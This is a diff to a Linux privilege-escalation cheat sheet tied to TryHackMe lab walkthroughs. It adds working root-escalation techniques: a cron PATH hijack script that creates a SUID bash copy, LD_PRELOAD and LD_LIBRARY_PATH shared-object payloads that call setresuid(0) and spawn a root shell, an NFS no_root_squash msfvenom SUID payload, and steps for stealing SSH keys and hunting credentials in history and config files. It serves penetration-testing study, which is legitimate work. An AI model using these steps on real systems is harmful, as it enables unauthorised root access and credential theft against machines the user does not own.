@@ -21,7 +21,25 @@ Check for passwords in environment variables
 env
 ```
 
-### Crontab
+## Weak File Permissions
+
+### Readable /etc/shadow
+
+[#weak-file-permissions-readable-etc-shadow](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-readable-etc-shadow "mention")
+
+### Writable /etc/shadow
+
+[#weak-file-permissions-writable-etc-shadow](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-writable-etc-shadow "mention")
+
+### Writable /etc/passwd
+
+[#weak-file-permissions-writable-etc-passwd](../../../../walkthroughs/tryhackme/linux-privesc.md#weak-file-permissions-writable-etc-passwd "mention")
+
+
+
+## Cron Jobs
+
+
 
 **Victim**
 
@@ -37,11 +55,114 @@ Possible other places crons are running
 cat /etc/cron.d/*
 ```
 
+### Cron Jobs - File Permissions
+
+**Examples**
+
+[#cron-jobs-file-permissions](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-file-permissions "mention")
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab.
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+```
+cat /etc/crontab
+```
+
+<figure><img src="../../../../.gitbook/assets/image (44) (1) (2).png" alt=""><figcaption></figcaption></figure>
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+Locate the full path of the overwrite.sh file.
+
+**Victim**
+
+```
+locate overwrite.sh
+```
+
+Note that the file is world-writable.
+
+**Victim**
+
+```
+ls -l /usr/local/bin/overwrite.sh
+```
+
+### Cron Jobs - PATH Environment Variable
+
+**Examples**
+
+[#cron-jobs-path-environment-variable](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-path-environment-variable "mention")
+
+View the contents of the system-wide crontab
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+Note that the PATH variable starts with /home/user which is our user's home directory. Create a file called overwrite.sh in your home directory with the following contents
+
+<figure><img src="../../../../.gitbook/assets/image (29) (3).png" alt=""><figcaption></figcaption></figure>
+
+#### overwrite.sh
+
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+Make sure that the file is executable
+
+**Victim**
+
+```
+chmod +x /home/user/overwrite.sh
+```
+
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+
+**Victim**
+
+```
+/tmp/rootbash -p
+```
+
+### Cron Jobs - Wildcards
+
+**Examples**
+
+[#cron-jobs-wildcards](../../../../walkthroughs/tryhackme/linux-privesc.md#cron-jobs-wildcards "mention")
+
+View the contents of the other cron job script
+
+**Victim**
+
+```
+cat /usr/local/bin/compress.sh
+```
+
+<figure><img src="../../../../.gitbook/assets/image (10) (1) (2) (1) (2).png" alt=""><figcaption></figcaption></figure>
+
+Note that the tar command is being run with a wildcard (\*) in your home directory.
+
+
+
 ## Sudo/SUID/Capabilities <a href="#user-content-sudosuidcapabilities" id="user-content-sudosuidcapabilities"></a>
 
 Run all of these commands then check [https://gtfobins.github.io/](https://gtfobins.github.io/) . They may give different results
 
-### **Check what can be run with NOPASSWD**
+Check what can be run with NOPASSWD
 
 **Victim**
 
@@ -51,11 +172,161 @@ sudo -l
 
 
 
-| Finding      | Comment              | Examples                                                                                                       |
+| Finding      | Comments             | Examples                                                                                                       |
 | ------------ | -------------------- | -------------------------------------------------------------------------------------------------------------- |
 | yum          | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention")                                  |
 | anansi\_util | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")                                    |
 | vi           |                      | [#escaping-vi-editor](../../../../walkthroughs/tryhackme/common-linux-privesc.md#escaping-vi-editor "mention") |
+| apache2      |                      | [#apache2](../../../../walkthroughs/tryhackme/linux-privesc.md#apache2 "mention")                              |
+| nmap         |                      | [#nmap](../../../../walkthroughs/tryhackme/linux-privesc.md#nmap "mention")                                    |
+| ftp          |                      | [#ftp](../../../../walkthroughs/tryhackme/linux-privesc.md#ftp "mention")                                      |
+| more         |                      | [#more](../../../../walkthroughs/tryhackme/linux-privesc.md#more "mention")                                    |
+| less         |                      | [#less](../../../../walkthroughs/tryhackme/linux-privesc.md#less "mention")                                    |
+| awk          |                      | [#awk](../../../../walkthroughs/tryhackme/linux-privesc.md#awk "mention")                                      |
+| man          |                      | [#man](../../../../walkthroughs/tryhackme/linux-privesc.md#man "mention")                                      |
+| vim          |                      | [#vim](../../../../walkthroughs/tryhackme/linux-privesc.md#vim "mention")                                      |
+| find         |                      | [#find](../../../../walkthroughs/tryhackme/linux-privesc.md#find "mention")                                    |
+| iftop        |                      | [#iftop](../../../../walkthroughs/tryhackme/linux-privesc.md#iftop "mention")                                  |
+|              |                      |                                                                                                                |
+
+### SUID / SGID Executables - Known Exploits
+
+Find all the SUID/SGID executables on the Debian VM.
+
+**Victim**
+
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+
+
+| Finding | Comments       | Examples                                                                                                                                    |
+| ------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| exim    | version 4.84-3 | [#suid-sgid-executables-known-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-known-exploits "mention") |
+|         |                |                                                                                                                                             |
+|         |                |                                                                                                                                             |
+
+
+
+### SUID / SGID Executables - Shared Object Injection
+
+[#suid-sgid-executables-shared-object-injection](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-shared-object-injection "mention")
+
+
+
+### SUID / SGID Executables - Environment Variables
+
+[#suid-sgid-executables-environment-variables](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-environment-variables "mention")
+
+
+
+### SUID / SGID Executables - Abusing Shell Features
+
+[#suid-sgid-executables-abusing-shell-features-1](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-abusing-shell-features-1 "mention")
+
+[#suid-sgid-executables-abusing-shell-features-2](../../../../walkthroughs/tryhackme/linux-privesc.md#suid-sgid-executables-abusing-shell-features-2 "mention")
+
+## Sudo - Environment Variables
+
+### LD\_LIBRARY\_PATH
+
+**Examples**
+
+[#sudo-environment-variables](../../../../walkthroughs/tryhackme/linux-privesc.md#sudo-environment-variables "mention")
+
+#### preload.c - code
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+#### library\_path.c
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+Sudo can be configured to inherit certain environment variables from the user's environment. Check which environment variables are inherited (look for the env\_keep options):
+
+**Victim**
+
+```
+sudo -l
+```
+
+<figure><img src="../../../../.gitbook/assets/image (32) (3) (1).png" alt=""><figcaption></figcaption></figure>
+
+**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.
+
+Create a shared object using the code located at /home/user/tools/sudo/preload.c.
+
+**Victim**
+
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+
+**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.
+
+Create a shared object using the code located at /home/user/tools/sudo/preload.c
+
+**Victim**
+
+```
+sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
+```
+
+<figure><img src="../../../../.gitbook/assets/image (31) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
+
+Run ldd against the apache2 program file to see which shared libraries are used by the program.
+
+**Victim**
+
+```
+ldd /usr/sbin/apache2
+```
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
+
+**Victim**
+
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+<figure><img src="../../../../.gitbook/assets/image (8) (8).png" alt=""><figcaption></figcaption></figure>
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
+
+**Victim**
+
+<pre><code><strong>sudo LD_LIBRARY_PATH=/tmp apache2
+</strong></code></pre>
+
+<figure><img src="../../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>
+
+
 
 ### **LD\_PRELOAD**
 
@@ -96,7 +367,7 @@ sudo LD_PRELOAD=/tmp/preload.so $NOPASSWD_SCRIPT_WE_CAN_ABUSE
 
 
 
-### **Files with SUID-bit set**
+## **Files with SUID-bit set**
 
 **Victim**
 
@@ -114,7 +385,7 @@ find / -perm -u=s -type f 2> /dev/null
 | cputils                       | Can copy files                                                                                                      | [olympus.md](../../../../walkthroughs/tryhackme/olympus.md "mention")                                                                                                                                                                                                                                        |
 | tar                           | Can spawn shell                                                                                                     | [skynet.md](../../../../walkthroughs/tryhackme/skynet.md "mention")                                                                                                                                                                                                                                          |
 
-### Getcap
+## Getcap
 
 **Victim**
 
@@ -128,6 +399,18 @@ getcap -r / 2>/dev/null
 | vim     | Can spawn shell                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
 | perl    | Can spawn shell                                                                                                                                                                                                      | [wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")                                 |
 | openssl | Can spawn shell                                                                                                                                                                                                      | [mindgames.md](../../../../walkthroughs/tryhackme/mindgames.md "mention")                                   |
+
+
+
+## **Service Exploits**
+
+| Finding | Comments | Examples                                                                                            |
+| ------- | -------- | --------------------------------------------------------------------------------------------------- |
+| mysql   |          | [#service-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#service-exploits "mention") |
+|         |          |                                                                                                     |
+|         |          |                                                                                                     |
+
+
 
 
 
@@ -185,7 +468,122 @@ export PATH=/tmp:$PATH
 
 <figure><img src="../../../../.gitbook/assets/image (14) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Passwords & Keys&#x20;
+
+### History Files
+
+**Examples**
+
+[#passwords-and-keys-history-files](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-history-files "mention")
+
+**Victim**
+
+```
+cat ~/.*history | less
+```
+
+### Config Files
+
+**Examples**
+
+[#passwords-and-keys-config-files](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-config-files "mention")
+
+**Victim**
+
+```
+cat /home/user/myvpn.ovpn
+```
+
+### SSH Keys
+
+**Examples**
+
+[#passwords-and-keys-ssh-keys](../../../../walkthroughs/tryhackme/linux-privesc.md#passwords-and-keys-ssh-keys "mention")
+
+Look for hidden files & directories in the system root.
+
+**Victim**
+
+```
+cat /home/$USER/.ssh/#KEY
+```
+
+Copy the key over to your Kali box (it's easier to just view the contents of the $KEY file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it.
+
 **Kali**
+
+<pre><code><strong>chmod 600 $KEY
+</strong><strong>ssh -i $KEY -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa $USER@$VICTIM
+</strong></code></pre>
+
+## NFS
+
+**Examples**
+
+[#nfs](../../../../walkthroughs/tryhackme/linux-privesc.md#nfs "mention")
+
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+Check the NFS share configuration on the Debian VM.
+
+**Victim**
+
+```
+cat /etc/exports
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1) (6) (3).png" alt=""><figcaption></figcaption></figure>
+
+Note that the /tmp share has root squashing disabled.
+
+On your Kali box, switch to your root user if you are not already running as root.
+
+**Kali**
+
+```
+sudo su
+```
+
+Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly).
+
+**Kali**
+
+```
+mkdir /tmp/nfs
+mount -o rw,vers=3 $VICTIM:/tmp /tmp/nfs
+```
+
+Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash).
+
+**Kali**
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+
+Still using Kali's root user, make the file executable and set the SUID permission.
+
+**Kali**
+
+```
+chmod +xs /tmp/nfs/shell.elf
+```
+
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell.
+
+**Victim**
+
+```
+/tmp/shell.elf
+```
+
+<figure><img src="../../../../.gitbook/assets/image (7) (7) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Kernel Exploits
+
+**Examples**
+
+[#kernel-exploits](../../../../walkthroughs/tryhackme/linux-privesc.md#kernel-exploits "mention")
 
 ## Writable Files
 
@@ -217,6 +615,7 @@ May be able to find open ports only accessible internally.&#x20;
 
 ```
 ss -ltp
+netstat -tuan
 ```
 
 
